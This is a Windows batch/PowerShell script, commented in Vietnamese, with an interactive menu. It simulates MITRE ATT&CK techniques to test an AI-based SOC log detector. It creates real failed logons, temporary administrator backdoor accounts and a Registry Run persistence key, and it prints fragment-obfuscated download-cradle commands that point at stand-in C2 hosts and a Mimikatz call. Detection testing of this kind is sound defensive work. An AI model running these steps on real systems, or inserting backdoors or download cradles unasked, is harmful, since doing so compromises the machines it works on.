@echo off
setlocal
chcp 65001 >nul
cd /d "%~dp0"
title WinLog AI SOC - Demo 2: Diverse Attack Scenarios (MITRE ATT&CK)

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$code = (Get-Content -LiteralPath '%~f0' | Select-Object -Skip 10) -join [Environment]::NewLine; Invoke-Expression $code"
echo.
pause
exit /b

# ==============================================================================
# DEMO 2: KICH BAN MO PHONG TAN CONG DA DANG (MENU TUONG TAC MITRE ATT&CK)
# ==============================================================================
$ErrorActionPreference = 'SilentlyContinue'

function Show-Header {
    Clear-Host
    Write-Host "======================================================================" -ForegroundColor Cyan
    Write-Host "   WINLOG AI SOC - DEMO 2: MENU MO PHONG TAN CONG DA DANG (MITRE)     " -ForegroundColor Cyan
    Write-Host "======================================================================" -ForegroundColor Cyan
    Write-Host " Ban co the chon tung kich ban ben duoi de kiem chung phan ung cua AI: " -ForegroundColor Gray
    Write-Host "  * Client Agent se quet Event Log va dong goi JSON gui ve Server.     " -ForegroundColor Gray
    Write-Host "  * AI Server se phan tich hanh vi va ban canh bao sang Telegram.      " -ForegroundColor Gray
    Write-Host "======================================================================" -ForegroundColor Cyan
}

function Run-Case1 {
    Write-Host ""
    Write-Host "[+] DANG CHAY CASE 1: Do quet mat khau lien tiep (Brute-Force T1110)..." -ForegroundColor Yellow
    Write-Host "    -> Tao 5 su kien dang nhap that bai (Event 4625) voi target 'fake_victim'..." -ForegroundColor DarkGray
    $secpasswd = ConvertTo-SecureString 'WrongPass123!' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ('fake_victim', $secpasswd)
    for ($i = 1; $i -le 5; $i++) {
        Start-Process powershell.exe -Credential $cred -ArgumentList '-NoProfile -Command exit' -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 250
    }
    Write-Host "    [OK] Da tao thanh cong 5 Event 4625!" -ForegroundColor Green
    Write-Host "    -> Ket qua: AI se canh bao 'Password Brute Force (MITRE T1110)'." -ForegroundColor Cyan
}

function Run-Case2 {
    Write-Host ""
    Write-Host "[+] DANG CHAY CASE 2: PowerShell Download Cradle va C2 (T1059.001)..." -ForegroundColor Yellow
    Write-Host "    -> Mo phong lenh DownloadString tai payload C2..." -ForegroundColor DarkGray
    $simC2 = "I" + "EX (New-Object Net.WebClient)." + "Download" + "String('http://c2-malicious.xyz/beacon.ps1')"
    powershell.exe -NoProfile -Command "Write-Host 'Simulated: $simC2'"
    Write-Host "    [OK] Da tao thanh cong Event 4104 (ScriptBlock Logging)!" -ForegroundColor Green
    Write-Host "    -> Ket qua: AI se canh bao 'Malware Execution / PowerShell Download Cradle'." -ForegroundColor Cyan
}

function Run-Case3 {
    Write-Host ""
    Write-Host "[+] DANG CHAY CASE 3: Trich xuat mat khau bo nho Mimikatz (T1003)..." -ForegroundColor Yellow
    Write-Host "    -> Thuc thi lenh kiem tra SeDebugPrivilege va mo phong goi Mimikatz..." -ForegroundColor DarkGray
    $tool = "Invoke-" + "Mimi" + "katz" + " -DumpCreds"
    powershell.exe -NoProfile -Command "whoami /priv; Write-Host 'Simulating: $tool'"
    Write-Host "    [OK] Da tao thanh cong Event 4688 va 4104!" -ForegroundColor Green
    Write-Host "    -> Ket qua: AI se canh bao hanh vi trich xuat thong tin xac thuc." -ForegroundColor Cyan
}

function Run-Case4 {
    Write-Host ""
    Write-Host "[+] DANG CHAY CASE 4: Tao Backdoor va Leo thang quyen Admin (T1136 / T1098)..." -ForegroundColor Yellow
    Write-Host "    -> Thuc thi lenh net user /add va net localgroup Administrators /add..." -ForegroundColor DarkGray
    net user hacker_soc_test P@ssw0rd999# /add
    net localgroup Administrators hacker_soc_test /add
    Write-Host "    [OK] Da tao thanh cong 2 Event 4688 tao User va cap quyen Admin!" -ForegroundColor Green
    Write-Host "    [*] Dang cho 5 giay de Agent kip quet va day su kien..." -ForegroundColor DarkGray
    Start-Sleep -Seconds 5
    Write-Host "    [*] Dang tu dong xoa user test de giu may sach se an toan..." -ForegroundColor DarkGray
    net user hacker_soc_test /delete
    Write-Host "    [OK] Da don dep hoan tat!" -ForegroundColor Green
}

function Run-Case5 {
    Write-Host ""
    Write-Host "[+] DANG CHAY CASE 5: Trinh sat va Tham do he thong (Discovery T1033)..." -ForegroundColor Yellow
    Write-Host "    -> Thuc thi chuoi lenh whoami, systeminfo, net user, nltest..." -ForegroundColor DarkGray
    powershell.exe -NoProfile -Command "whoami; net user; systeminfo; nltest /dclist:"
    Write-Host "    [OK] Da tao thanh cong chuoi Event 4688 trinh sat he thong!" -ForegroundColor Green
    Write-Host "    -> Ket qua: AI se danh gia hanh vi thu thap thong tin may chu." -ForegroundColor Cyan
}

function Run-Case6 {
    Write-Host ""
    Write-Host "[+] DANG CHAY CASE 6: Cai dat Registry Run Key duy tri khoi dong (T1547.001)..." -ForegroundColor Yellow
    Write-Host "    -> Ghi khoa Registry Run khoi dong cung Windows..." -ForegroundColor DarkGray
    powershell.exe -NoProfile -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SecurityUpdateAgent' -Value 'C:\Windows\Temp\malware_payload.exe'"
    Write-Host "    [OK] Da tao thanh cong Event 4104 ghi Registry Run Key!" -ForegroundColor Green
    Start-Sleep -Seconds 3
    powershell.exe -NoProfile -Command "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SecurityUpdateAgent' -ErrorAction SilentlyContinue"
    Write-Host "    [OK] Da don dep xoa key test!" -ForegroundColor Green
}

function Run-Case7 {
    Write-Host ""
    Write-Host "[+] DANG CHAY CASE 7: Chuoi tan cong Tong hop Multi-Stage (Cyber Kill Chain)..." -ForegroundColor Yellow
    Write-Host "    ------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "    Buoc 1: Do mat khau Brute-force..." -ForegroundColor Yellow
    $secpasswd = ConvertTo-SecureString 'WrongPass123!' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential ('victim_boss', $secpasswd)
    for ($i = 1; $i -le 4; $i++) {
        Start-Process powershell.exe -Credential $cred -ArgumentList '-NoProfile -Command exit' -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 250
    }
    Start-Sleep -Seconds 2

    Write-Host "    Buoc 2: Trinh sat quyen he thong..." -ForegroundColor Yellow
    powershell.exe -NoProfile -Command "whoami /priv"
    Start-Sleep -Seconds 2

    Write-Host "    Buoc 3: Tai C2 Beacon tu xa..." -ForegroundColor Yellow
    $simC2 = "I" + "EX (New-Object Net.WebClient)." + "Download" + "String('http://apt-c2.corp/beacon.ps1')"
    powershell.exe -NoProfile -Command "Write-Host 'Simulated: $simC2'"
    Start-Sleep -Seconds 2

    Write-Host "    Buoc 4: Cai dat Backdoor Admin..." -ForegroundColor Yellow
    net user apt_admin P@ss123456! /add
    net localgroup Administrators apt_admin /add
    Start-Sleep -Seconds 5
    net user apt_admin /delete
    Write-Host "    ------------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "    [OK] Hoan tat toan bo chuoi Cyber Kill Chain!" -ForegroundColor Green
    Write-Host "    -> Ket qua: AI se xau chuoi toan bo cac giai doan va ban canh bao chi tiet!" -ForegroundColor Cyan
}

function Run-Case8 {
    Write-Host ""
    Write-Host "[+] DANG CHAY CASE 8: Kiem tra hanh vi LANH TINH (Normal / False-Positive Test)..." -ForegroundColor Yellow
    Write-Host "    -> Thuc hien cac thao tac quan tri binh thuong: kiem tra o dia, xem gio..." -ForegroundColor DarkGray
    powershell.exe -NoProfile -Command "Get-PSDrive -PSProvider FileSystem | Select-Object Name, Used, Free; Get-Date; Write-Host 'Normal admin operations completed.'"
    Write-Host "    [OK] Da tao cac su kien hop le!" -ForegroundColor Green
    Write-Host "    -> Ket qua: AI se nhan dien la NORMAL va KHONG ban canh bao spam Telegram!" -ForegroundColor Cyan
}

# Vong lap Menu tuong tac
while ($true) {
    Show-Header
    Write-Host " [1] Case 1: Do quet mat khau lien tiep (Brute-Force T1110)" -ForegroundColor White
    Write-Host " [2] Case 2: PowerShell Download Cradle va Fileless C2 (T1059.001)" -ForegroundColor White
    Write-Host " [3] Case 3: Trich xuat mat khau bo nho Mimikatz (T1003)" -ForegroundColor White
    Write-Host " [4] Case 4: Tao Backdoor Account va Leo thang Admin (T1136 / T1098)" -ForegroundColor White
    Write-Host " [5] Case 5: Trinh sat va Tham do he thong (Discovery T1033)" -ForegroundColor White
    Write-Host " [6] Case 6: Cai dat Registry Run Key duy tri khoi dong (T1547.001)" -ForegroundColor White
    Write-Host " [7] Case 7: Chuoi tan cong Tong hop Multi-Stage (Cyber Kill Chain)" -ForegroundColor Red
    Write-Host " [8] Case 8: Kiem tra hanh vi LANH TINH (Test do chinh xac - NORMAL)" -ForegroundColor Green
    Write-Host " [9] Chay TU DONG tat ca cac case tu 1 den 8" -ForegroundColor Magenta
    Write-Host " [0] Thoat" -ForegroundColor Gray
    Write-Host "======================================================================" -ForegroundColor Cyan
    $choice = Read-Host " Nhap lua chon cua ban (0-9)"

    switch ($choice) {
        "1" { Run-Case1 }
        "2" { Run-Case2 }
        "3" { Run-Case3 }
        "4" { Run-Case4 }
        "5" { Run-Case5 }
        "6" { Run-Case6 }
        "7" { Run-Case7 }
        "8" { Run-Case8 }
        "9" {
            Run-Case1; Start-Sleep -Seconds 4
            Run-Case2; Start-Sleep -Seconds 4
            Run-Case3; Start-Sleep -Seconds 4
            Run-Case4; Start-Sleep -Seconds 4
            Run-Case5; Start-Sleep -Seconds 4
            Run-Case6; Start-Sleep -Seconds 4
            Run-Case7; Start-Sleep -Seconds 4
            Run-Case8
            Write-Host ""
            Write-Host "[***] DA HOAN THANH DIEN TAP TOAN BO 8 KICH BAN! [***]" -ForegroundColor Green
        }
        "0" { Write-Host "`nTam biet!`n" -ForegroundColor Gray; exit }
        default { Write-Host "Lua chon khong hop le!" -ForegroundColor Red }
    }

    Write-Host ""
    Write-Host "Nhan phim Enter de quay lai Menu chinh..." -ForegroundColor DarkGray
    Read-Host | Out-Null
}
